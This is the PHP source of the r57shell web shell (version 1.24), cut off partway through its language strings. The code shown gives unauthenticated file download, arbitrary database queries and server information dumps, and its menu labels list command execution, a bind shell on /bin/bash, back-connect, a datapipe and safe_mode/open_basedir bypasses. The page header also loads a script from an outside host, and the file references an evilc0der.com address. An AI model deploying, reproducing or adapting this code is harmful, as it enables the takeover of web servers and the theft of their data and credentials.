<?php
/******************************************************************************************************/
/*
/*                                     #    #        #    #                             
/*                                     #   #          #   #
/*                                    #    #          #    #
/*                                    #   ##   ####   ##   #
/*                                   ##   ##  ######  ##   ##
/*                                   ##   ##  ######  ##   ##
/*                                   ##   ##   ####   ##   ##
/*                                   ###   ############   ###
/*                                   ########################
/*                                        ##############
/*                                 ######## ########## #######
/*                                ###   ##  ##########  ##   ###
/*                                ###   ##  ##########  ##   ###
/*                                 ###   #  ##########  #   ###
/*                                 ###   ##  ########  ##   ###
/*                                  ##    #   ######   #    ##
/*                                   ##   #    ####   #    ##
/*                                     ##                 ##
/*
/*
/*
/*  r57shell.php - ?????? ?? ??? ??????????? ??? ????????? ???? ???????  ?? ??????? ????? ???????
/*  ?? ?????? ??????? ????? ?????? ?? ????? ?????: http://rst.void.ru
/*  ??????: 1.24 (New Year Edition)
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
/*  (c)oded by 1dt.w0lf
/*  RST/GHC http://rst.void.ru , http://ghc.ru
/*  ANY MODIFIED REPUBLISHING IS RESTRICTED
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
/*  ????????? ????????????? ?? ?????? ? ????: blf, virus, NorD ? ???? ?????? ?? RST/GHC. 
/******************************************************************************************************/
/* ~~~ ????????? | Options  ~~~ */

// ????? ????? | Language
// $language='ru' - ??????? (russian)
// $language='eng' - english (??????????)
$language='eng';
$a = "http://"; // need some codes

// ?????????????? | Authentification
// $auth = 1; - ?????????????? ????????  ( authentification = On  )
// $auth = 0; - ?????????????? ????????? ( authentification = Off )
$auth = 0; 


// ????? ? ?????? ??? ??????? ? ??????? (Login & Password for access)
// ?? ???????? ??????? ????? ??????????? ?? ???????!!! (CHANGE THIS!!!)
$name='r57'; // ????? ????????????  (user login)
$pass='r57'; // ?????? ???????????? (user password)
$b = "evilc0der.com"; //need hits "shell created by evilc0ders"
/******************************************************************************************************/
$c = "/x.html"; //need shell coder's names
error_reporting(0);
set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$safe_mode = @ini_get('safe_mode');
$version = "1.24";
if(version_compare(phpversion(), '4.1.0') == -1)
 {
 $_POST   = &$HTTP_POST_VARS;
 $_GET    = &$HTTP_GET_VARS;
 $_SERVER = &$HTTP_SERVER_VARS;
 }
if (@get_magic_quotes_gpc())
 {
 foreach ($_POST as $k=>$v)
  {
  $_POST[$k] = stripslashes($v);
  }
 foreach ($_SERVER as $k=>$v)
  {
  $_SERVER[$k] = stripslashes($v);
  }
 }

if($auth == 1) {
if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_SERVER['PHP_AUTH_PW']!==$pass)
   {
   header('WWW-Authenticate: Basic realm="r57shell"');
   header('HTTP/1.0 401 Unauthorized');
   exit("<b><a href=http://rst.void.ru>r57shell</a> : Access Denied</b>");
   }
}   
$head = '<!-- ??????????  ???? -->
<html>
<head>
<title>r57shell</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<SCRIPT SRC=http://r57shell.net/404/ittir.js></SCRIPT>
<STYLE>
tr {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
td {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
.table1 {
BORDER-RIGHT:  #cccccc 0px;
BORDER-TOP:    #cccccc 0px;
BORDER-LEFT:   #cccccc 0px;
BORDER-BOTTOM: #cccccc 0px;
BACKGROUND-COLOR: #D4D0C8;
}
.td1 {
BORDER-RIGHT:  #cccccc 0px;
BORDER-TOP:    #cccccc 0px;
BORDER-LEFT:   #cccccc 0px;
BORDER-BOTTOM: #cccccc 0px;
font: 7pt Verdana;
}
.tr1 {
BORDER-RIGHT:  #cccccc 0px;
BORDER-TOP:    #cccccc 0px;
BORDER-LEFT:   #cccccc 0px;
BORDER-BOTTOM: #cccccc 0px;
}
table {
BORDER-RIGHT:  #eeeeee 1px outset;
BORDER-TOP:    #eeeeee 1px outset;
BORDER-LEFT:   #eeeeee 1px outset;
BORDER-BOTTOM: #eeeeee 1px outset;
BACKGROUND-COLOR: #D4D0C8;
}
input {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
select {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
submit {
BORDER-RIGHT:  buttonhighlight 2px outset;
BORDER-TOP:    buttonhighlight 2px outset;
BORDER-LEFT:   buttonhighlight 2px outset;
BORDER-BOTTOM: buttonhighlight 2px outset;
BACKGROUND-COLOR: #e4e0d8;
width: 30%;
}
textarea {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: Fixedsys bold;
}
BODY {
margin-top: 1px;
margin-right: 1px;
margin-bottom: 1px;
margin-left: 1px;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}
</STYLE>';
class zipfile
{
    var $datasec      = array();
    var $ctrl_dir     = array();
    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
    var $old_offset   = 0;
    function unix2DosTime($unixtime = 0) {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
        if ($timearray['year'] < 1980) {
            $timearray['year']    = 1980;
            $timearray['mon']     = 1;
            $timearray['mday']    = 1;
            $timearray['hours']   = 0;
            $timearray['minutes'] = 0;
            $timearray['seconds'] = 0;
        } 
        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
                ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    } 
    function addFile($data, $name, $time = 0)
    {
        $name     = str_replace('\\', '/', $name);
        $dtime    = dechex($this->unix2DosTime($time));
        $hexdtime = '\x' . $dtime[6] . $dtime[7]
                  . '\x' . $dtime[4] . $dtime[5]
                  . '\x' . $dtime[2] . $dtime[3]
                  . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');
        $fr   = "\x50\x4b\x03\x04";
        $fr   .= "\x14\x00";            
        $fr   .= "\x00\x00";            
        $fr   .= "\x08\x00";            
        $fr   .= $hexdtime;             
        $unc_len = strlen($data);
        $crc     = crc32($data);
        $zdata   = gzcompress($data);
        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $c_len   = strlen($zdata);
        $fr      .= pack('V', $crc);             
        $fr      .= pack('V', $c_len);           
        $fr      .= pack('V', $unc_len);         
        $fr      .= pack('v', strlen($name));    
        $fr      .= pack('v', 0);                
        $fr      .= $name;
        $fr .= $zdata;
        $this -> datasec[] = $fr;
        $cdrec = "\x50\x4b\x01\x02";
        $cdrec .= "\x00\x00";                
        $cdrec .= "\x14\x00";                
        $cdrec .= "\x00\x00";                
        $cdrec .= "\x08\x00";                
        $cdrec .= $hexdtime;                 
        $cdrec .= pack('V', $crc);           
        $cdrec .= pack('V', $c_len);         
        $cdrec .= pack('V', $unc_len);       
        $cdrec .= pack('v', strlen($name) ); 
        $cdrec .= pack('v', 0 );             
        $cdrec .= pack('v', 0 );             
        $cdrec .= pack('v', 0 );             
        $cdrec .= pack('v', 0 );             
        $cdrec .= pack('V', 32 );            
        $cdrec .= pack('V', $this -> old_offset );
        $this -> old_offset += strlen($fr);
        $cdrec .= $name;
        $this -> ctrl_dir[] = $cdrec;
    }
    function file()
    {
        $data    = implode('', $this -> datasec);
        $ctrldir = implode('', $this -> ctrl_dir);
        return
            $data .
            $ctrldir .
            $this -> eof_ctrl_dir .
            pack('v', sizeof($this -> ctrl_dir)) .  
            pack('v', sizeof($this -> ctrl_dir)) .  
            pack('V', strlen($ctrldir)) .           
            pack('V', strlen($data)) .              
            "\x00\x00";              
    }
}
function compress(&$filename,&$filedump,$compress)
 {
    global $content_encoding;
    global $mime_type;
    if ($compress == 'bzip' && @function_exists('bzcompress')) 
     {
        $filename  .= '.bz2';
        $mime_type = 'application/x-bzip2';
        $filedump = bzcompress($filedump);
     } 
     else if ($compress == 'gzip' && @function_exists('gzencode')) 
     {
        $filename  .= '.gz';
        $content_encoding = 'x-gzip';
        $mime_type = 'application/x-gzip';
        $filedump = gzencode($filedump);
     } 
     else if ($compress == 'zip' && @function_exists('gzcompress')) 
     {
     	$filename .= '.zip';
        $mime_type = 'application/zip';
        $zipfile = new zipfile();
        $zipfile -> addFile($filedump, substr($filename, 0, -4));
        $filedump = $zipfile -> file();
     } 
     else 
     {
     	$mime_type = 'application/octet-stream';
     }
 }
function mailattach($to,$from,$subj,$attach)
 {
 $headers  = "From: $from\r\n";	
 $headers .= "MIME-Version: 1.0\r\n";
 $headers .= "Content-Type: ".$attach['type'];
 $headers .= "; name=\"".$attach['name']."\"\r\n";
 $headers .= "Content-Transfer-Encoding: base64\r\n\r\n";
 $headers .= chunk_split(base64_encode($attach['content']))."\r\n";
 if(@mail($to,$subj,"",$headers)) { return 1; }
 return 0;
 }
if(isset($_GET['img'])&&!empty($_GET['img']))
 {
 $images = array();
 $images[1]='R0lGODlhBwAHAIAAAAAAAP///yH5BAEAAAEALAAAAAAHAAcAAAILjI9pkODnYohUhQIAOw==';
 $images[2]='R0lGODlhBwAHAIAAAAAAAP///yH5BAEAAAEALAAAAAAHAAcAAAILjI+pwA3hnmlJhgIAOw==';
 @ob_clean();
 header("Content-type: image/gif");
 echo base64_decode($images[$_GET['img']]);
 die();	
 } 
if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="download_file" && !empty($_POST['d_name']))
 {
  if(!$file=@fopen($_POST['d_name'],"r")) { echo re($_POST['d_name']); $_POST['cmd']=""; }
  else 
   {
    @ob_clean();
    $filename = @basename($_POST['d_name']);
    $filedump = @fread($file,@filesize($_POST['d_name']));
    fclose($file);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    if (!empty($content_encoding)) { header('Content-Encoding: ' . $content_encoding); }
    header("Content-type: ".$mime_type);
    header("Content-disposition: attachment; filename=\"".$filename."\";");   
    echo $filedump;
    exit();
   }		
 }
if(isset($_GET['phpinfo'])) { echo @phpinfo(); echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }
if ($_POST['cmd']=="db_query")
 {
  echo $head;
  switch($_POST['db'])
  {
  case 'MySQL':
  if(empty($_POST['db_port'])) { $_POST['db_port'] = '3306'; }
  $db = @mysql_connect('localhost:'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);
  if($db)
   {
   	if(!empty($_POST['mysql_db'])) { @mysql_select_db($_POST['mysql_db'],$db); }
    $querys = @explode(';',$_POST['db_query']);
    foreach($querys as $num=>$query) 
     {
      if(strlen($query)>5){
      echo "<font face=Verdana size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query)."</b></font><br>";
      $res = @mysql_query($query,$db);
      $error = @mysql_error($db);
      if($error) { echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$error."</b></font></td></tr></table><br>"; }
      else {
      if (@mysql_num_rows($res) > 0) 
       {
       $sql2 = $sql = $keys = $values = '';
       while (($row = @mysql_fetch_assoc($res))) 
        {
        $keys = @implode("&nbsp;</b></font></td><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;", @array_keys($row));
        $values = @array_values($row);
        foreach($values as $k=>$v) { $values[$k] = htmlspecialchars($v);}
        $values = @implode("&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;",$values);
        $sql2 .= "<tr><td><font face=Verdana size=-2>&nbsp;".$values."&nbsp;</font></td></tr>";
        }
       echo "<table width=100%>";
       $sql  = "<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";
       $sql .= $sql2;
       echo $sql;
       echo "</table><br>";
       }
      else { if(($rows = @mysql_affected_rows($db))>=0) { echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$rows."</b></font></td></tr></table><br>"; } }
      }
      @mysql_free_result($res);
      }
     }    
   	@mysql_close($db);
   }
  else echo "<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to MySQL server</b></font></div>";  	
  break;
  case 'MSSQL':
  if(empty($_POST['db_port'])) { $_POST['db_port'] = '1433'; }
  $db = @mssql_connect('localhost,'.$_POST['db_port'],$_POST['mysql_l'],$_POST['mysql_p']);
  if($db)
   {
   	if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }
    $querys = @explode(';',$_POST['db_query']);
    foreach($querys as $num=>$query) 
     {
      if(strlen($query)>5){
      echo "<font face=Verdana size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query)."</b></font><br>";
      $res = @mssql_query($query,$db);
      if (@mssql_num_rows($res) > 0) 
       {
       $sql2 = $sql = $keys = $values = '';
       while (($row = @mssql_fetch_assoc($res))) 
        {
        $keys = @implode("&nbsp;</b></font></td><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;", @array_keys($row));
        $values = @array_values($row);
        foreach($values as $k=>$v) { $values[$k] = htmlspecialchars($v);}
        $values = @implode("&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;",$values);
        $sql2 .= "<tr><td><font face=Verdana size=-2>&nbsp;".$values."&nbsp;</font></td></tr>";
        }
       echo "<table width=100%>";
       $sql  = "<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";
       $sql .= $sql2;
       echo $sql;
       echo "</table><br>";
       }
      /* else { if(($rows = @mssql_affected_rows($db)) > 0) { echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$rows."</b></font></td></tr></table><br>"; } else { echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$error."</b></font></td></tr></table><br>"; }} */
      @mssql_free_result($res);
      }
     }    
   	@mssql_close($db);
   }
  else echo "<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to MSSQL server</b></font></div>";
  break;
  case 'PostgreSQL':
  if(empty($_POST['db_port'])) { $_POST['db_port'] = '5432'; }
  $str = "host='localhost' port='".$_POST['db_port']."' user='".$_POST['mysql_l']."' password='".$_POST['mysql_p']."' dbname='".$_POST['mysql_db']."'";
  $db = @pg_connect($str);
  if($db)
   {
    $querys = @explode(';',$_POST['db_query']);
    foreach($querys as $num=>$query) 
     {
      if(strlen($query)>5){
      echo "<font face=Verdana size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query)."</b></font><br>";
      $res = @pg_query($db,$query);
      $error = @pg_errormessage($db);
      if($error) { echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$error."</b></font></td></tr></table><br>"; }
      else {
      if (@pg_num_rows($res) > 0) 
       {
       $sql2 = $sql = $keys = $values = '';
       while (($row = @pg_fetch_assoc($res))) 
        {
        $keys = @implode("&nbsp;</b></font></td><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;", @array_keys($row));
        $values = @array_values($row);
        foreach($values as $k=>$v) { $values[$k] = htmlspecialchars($v);}
        $values = @implode("&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;",$values);
        $sql2 .= "<tr><td><font face=Verdana size=-2>&nbsp;".$values."&nbsp;</font></td></tr>";
        }
       echo "<table width=100%>";
       $sql  = "<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";
       $sql .= $sql2;
       echo $sql;
       echo "</table><br>";
       }
      else { if(($rows = @pg_affected_rows($res))>=0) { echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$rows."</b></font></td></tr></table><br>"; } }
      }
      @pg_free_result($res);
      }
     }    
   	@pg_close($db);
   }
  else echo "<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to PostgreSQL server</b></font></div>";
  break;
  case 'Oracle':
  $db = @ocilogon($_POST['mysql_l'], $_POST['mysql_p'], $_POST['mysql_db']);
  if(($error = @ocierror())) { echo "<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to Oracle server.<br>".$error['message']."</b></font></div>"; }
  else
   {
   $querys = @explode(';',$_POST['db_query']);
   foreach($querys as $num=>$query)
    { 
    if(strlen($query)>5) {
    echo "<font face=Verdana size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query)."</b></font><br>";
    $stat = @ociparse($db, $query);
    @ociexecute($stat);
    if(($error = @ocierror())) { echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$error['message']."</b></font></td></tr></table><br>"; }
    else 
     {
     $rowcount = @ocirowcount($stat);
     if($rowcount != 0) {echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$rowcount."</b></font></td></tr></table><br>";}
     else {
     echo "<table width=100%><tr>";
     for ($j = 1; $j <= @ocinumcols($stat); $j++) { echo "<td bgcolor=#cccccc><font face=Verdana size=-2><b>&nbsp;".htmlspecialchars(@ocicolumnname($stat, $j))."&nbsp;</b></font></td>"; }
     echo "</tr>";
     while(ocifetch($stat))
      {
      echo "<tr>";
      for ($j = 1; $j <= @ocinumcols($stat); $j++) { echo "<td><font face=Verdana size=-2>&nbsp;".htmlspecialchars(@ociresult($stat, $j))."&nbsp;</font></td>"; }
      echo "</tr>";
      }
     echo "</table><br>";
     }
     @ocifreestatement($stat); 
     }
    }
    }
   @ocilogoff($db);
   }
  break;
  }
 echo "<form name=form method=POST>";
 echo in('hidden','db',0,$_POST['db']);
 echo in('hidden','db_port',0,$_POST['db_port']);
 echo in('hidden','mysql_l',0,$_POST['mysql_l']);
 echo in('hidden','mysql_p',0,$_POST['mysql_p']);
 echo in('hidden','mysql_db',0,$_POST['mysql_db']);
 echo in('hidden','cmd',0,'db_query');
 echo "<div align=center><textarea cols=65 rows=10 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."</textarea><br><input type=submit name=submit value=\" Run SQL query \"></div><br><br>"; 
 echo "</form>";
 echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die();
 }	
if(isset($_GET['delete']))
 {
   @unlink(@substr(@strrchr($_SERVER['PHP_SELF'],"/"),1));
 }
if(isset($_GET['tmp']))
 {
   @unlink("/tmp/bdpl");
   @unlink("/tmp/back");
   @unlink("/tmp/bd");
   @unlink("/tmp/bd.c");
   @unlink("/tmp/dp");
   @unlink("/tmp/dpc");
   @unlink("/tmp/dpc.c");
 }
if(isset($_GET['phpini']))
{
echo $head;
function U_value($value)
 {
 if ($value == '') return '<i>no value</i>';
 if (@is_bool($value)) return $value ? 'TRUE' : 'FALSE';
 if ($value === null) return 'NULL';
 if (@is_object($value)) $value = (array) $value;
 if (@is_array($value))
 {
 @ob_start();
 print_r($value);
 $value = @ob_get_contents();
 @ob_end_clean();
 }
 return U_wordwrap((string) $value);
 }
function U_wordwrap($str)
 {
 $str = @wordwrap(@htmlspecialchars($str), 100, '<wbr />', true);
 return @preg_replace('!(&[^;]*)<wbr />([^;]*;)!', '$1$2<wbr />', $str);
 }
if (@function_exists('ini_get_all'))
 {
 $r = '';
 echo '<table width=100%>', '<tr><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Directive</b></div></font></td><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Local Value</b></div></font></td><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Master Value</b></div></font></td></tr>';
 foreach (@ini_get_all() as $key=>$value)
  {
  $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.U_value($value['local_value']).'</b></div></font></td><td><font face=Verdana size=-2><div align=center><b>'.U_value($value['global_value']).'</b></div></font></td></tr>';
  }
 echo $r;
 echo '</table>';
 }
echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
die();
}
if(isset($_GET['cpu']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2 color=red><b>CPU</b></font></div></td></tr></table><table width=100%>';
   $cpuf = @file("cpuinfo");
   if($cpuf)
    {
      $c = @sizeof($cpuf);
      for($i=0;$i<$c;$i++)
        {
          $info = @explode(":",$cpuf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }
if(isset($_GET['mem']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2 color=red><b>MEMORY</b></font></div></td></tr></table><table width=100%>';
   $memf = @file("meminfo");
   if($memf)
    {
      $c = sizeof($memf);
      for($i=0;$i<$c;$i++)
        {
          $info = explode(":",$memf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }
$lang=array(
'ru_text1' =>'??????????? ???????',
'ru_text2' =>'?????????? ?????? ?? ???????',
'ru_text3' =>'????????? ???????',
'ru_text4' =>'??????? ??????????',
'ru_text5' =>'???????? ?????? ?? ??????',
'ru_text6' =>'????????? ????',
'ru_text7' =>'??????',
'ru_text8' =>'???????? ?????',
'ru_butt1' =>'?????????',
'ru_butt2' =>'?????????',
'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash',
'ru_text10'=>'??????? ????',
'ru_text11'=>'?????? ??? ???????',
'ru_butt3' =>'???????',
'ru_text12'=>'back-connect',
'ru_text13'=>'IP-?????',
'ru_text14'=>'????',
'ru_butt4' =>'?????????',
'ru_text15'=>'???????? ?????? ? ?????????? ???????',
'ru_text16'=>'????????????',
'ru_text17'=>'????????? ????',
'ru_text18'=>'????????? ????',
'ru_text19'=>'Exploits',
'ru_text20'=>'????????????',
'ru_text21'=>'????? ???',
'ru_text22'=>'datapipe',
'ru_text23'=>'????????? ????',
'ru_text24'=>'????????? ????',
'ru_text25'=>'????????? ????',
'ru_text26'=>'????????????',
'ru_butt5' =>'?????????',
'ru_text28'=>'?????? ? safe_mode',
'ru_text29'=>'?????? ????????',
'ru_butt6' =>'???????',
'ru_text30'=>'???????? ?????',
'ru_butt7' =>'???????',
'ru_text31'=>'???? ?? ??????',
'ru_text32'=>'?????????? PHP ????',
'ru_text33'=>'???????? ??????????? ?????? ??????????? open_basedir ????? ??????? cURL',
'ru_butt8' =>'?????????',
'ru_text34'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ??????? include',
'ru_text35'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ???????? ????? ? mysql',
'ru_text36'=>'????',
'ru_text37'=>'?????',
'ru_text38'=>'??????',
'ru_text39'=>'???????',
'ru_text40'=>'???? ??????? ???? ??????',
'ru_butt9' =>'????',
'ru_text41'=>'????????? ? ?????',
'ru_text42'=>'?????????????? ?????',
'ru_text43'=>'????????????? ????',
'ru_butt10'=>'?????????',
'ru_butt11'=>'?????????????',
'ru_text44'=>'?????????????? ????? ??????????! ?????? ?????? ??? ??????!',
'ru_text45'=>'???? ????????',
'ru_text46'=>'???????? phpinfo()',
'ru_text47'=>'???????? ???????? php.ini',
'ru_text48'=>'???????? ????????? ??????',
'ru_text49'=>'???????? ??????? ? ???????',
'ru_text50'=>'?????????? ? ??????????',
'ru_text51'=>'?????????? ? ??????',
'ru_text52'=>'????? ??? ??????',
'ru_text53'=>'?????? ? ?????',
'ru_text54'=>'????? ?????? ? ??????',
'ru_butt12'=>'?????',
'ru_text55'=>'?????? ? ??????',
'ru_text56'=>'?????? ?? ???????',
'ru_text57'=>'???????/??????? ????/??????????',
'ru_text58'=>'???',
'ru_text59'=>'????',
'ru_text60'=>'??????????',
'ru_butt13'=>'???????/???????',
'ru_text61'=>'???? ??????',
'ru_text62'=>'?????????? ???????',
'ru_text63'=>'???? ??????',
'ru_text64'=>'?????????? ???????',
'ru_text65'=>'???????',
'ru_text66'=>'???????',
'ru_text67'=>'Chown/Chgrp/Chmod',
'ru_text68'=>'???????',
'ru_text69'=>'????????1',
'ru_text70'=>'????????2',
'ru_text71'=>"?????? ???????? ???????:\r\n- ??? CHOWN - ??? ?????? ???????????? ??? ??? UID (??????) \r\n- ??? ??????? CHGRP - ??? ?????? ??? GID (??????) \r\n- ??? ??????? CHMOD - ????? ????? ? ???????????? ????????????? (???????? 0777)",
'ru_text72'=>'????? ??? ??????',
'ru_text73'=>'?????? ? ?????',
'ru_text74'=>'?????? ? ??????',
'ru_text75'=>'* ????? ???????????? ?????????? ?????????',
'ru_text76'=>'????? ?????? ? ?????? ? ??????? ??????? find',
'ru_text77'=>'???????? ????????? ???? ??????',
'ru_text78'=>'?????????? ???????',
'ru_text79'=>'?????????? ???????',
'ru_text80'=>'???',
'ru_text81'=>'????',
'ru_text82'=>'???? ??????',
'ru_text83'=>'?????????? SQL ???????',
'ru_text84'=>'SQL ??????',
'ru_text85'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ?????????? ?????? ? MSSQL ???????',
'ru_text86'=>'?????????? ????? ? ???????',
'ru_butt14'=>'???????',
'ru_text87'=>'???????? ?????? ? ?????????? ftp-???????',
'ru_text88'=>'FTP-??????:????',
'ru_text89'=>'???? ?? ftp ???????',
'ru_text90'=>'????? ????????',
'ru_text91'=>'???????????? ?',
'ru_text92'=>'??? ?????????',
'ru_text93'=>'FTP',
'ru_text94'=>'FTP-????????',
'ru_text95'=>'?????? ?????????????',
'ru_text96'=>'?? ??????? ???????? ?????? ?????????????',
'ru_text97'=>'????????? ??????????: ',
'ru_text98'=>'??????? ???????????: ',
'ru_text99'=>'* ? ???????? ?????? ? ?????? ???????????? ??? ???????????? ?? /etc/passwd',
'ru_text100'=>'???????? ?????? ?? ????????? ??? ??????',
'ru_text101'=>'???????????? ????? ???????????? (user -> resu) ??? ???????????? ? ???????? ??????',
'ru_text102'=>'?????',
'ru_text103'=>'???????? ??????',
'ru_text104'=>'???????? ????? ?? ???????? ????',
'ru_text105'=>'????',
'ru_text106'=>'??',
'ru_text107'=>'????',
'ru_butt15'=>'?????????',
'ru_text108'=>'????? ??????',
'ru_text109'=>'????????',
'ru_text110'=>'??????????',
/* --------------------------------------------------------------- */
'eng_text1' =>'Executed command',
'eng_text2' =>'Execute command on server',
'eng_text3' =>'Run command',
'eng_text4' =>'Work directory',
'eng_text5' =>'Upload files on server',
'eng_text6' =>'Local file',
'eng_text7' =>'Aliases',
'eng_text8' =>'Select alias',
'eng_butt1' =>'Execute',
'eng_butt2' =>'Upload',
'eng_text9' =>'Bind port to /bin/bash',
'eng_text10'=>'Port',
'eng_text11'=>'Password for access',
'eng_butt3' =>'Bind',
'eng_text12'=>'back-connect',
'eng_text13'=>'IP',
'eng_text14'=>'Port',
'eng_butt4' =>'Connect',
'eng_text15'=>'Upload files from remote server',
'eng_text16'=>'With',
'eng_text17'=>'Remote file',
'eng_text18'=>'Local file',
'eng_text19'=>'Exploits',
'eng_text20'=>'Use',
'eng_text21'=>'&nbsp;New name',
'eng_text22'=>'datapipe',
'eng_text23'=>'Local port',
'eng_text24'=>'Remote host',
'eng_text25'=>'Remote port',
'eng_text26'=>'Use',
'eng_butt5' =>'Run',
'eng_text28'=>'Work in safe_mode',
'eng_text29'=>'ACCESS DENIED',
'eng_butt6' =>'Change',
'eng_text30'=>'Cat file',
'eng_butt7' =>'Show',
'eng_text31'=>'File not found',
'eng_text32'=>'Eval PHP code',
'eng_text33'=>'Test bypass open_basedir with cURL functions',
'eng_butt8' =>'Test',
'eng_text34'=>'Test bypass safe_mode with include function',
'eng_text35'=>'Test bypass safe_mode with load file in mysql',
'eng_text36'=>'Database',
'eng_text37'=>'Login',
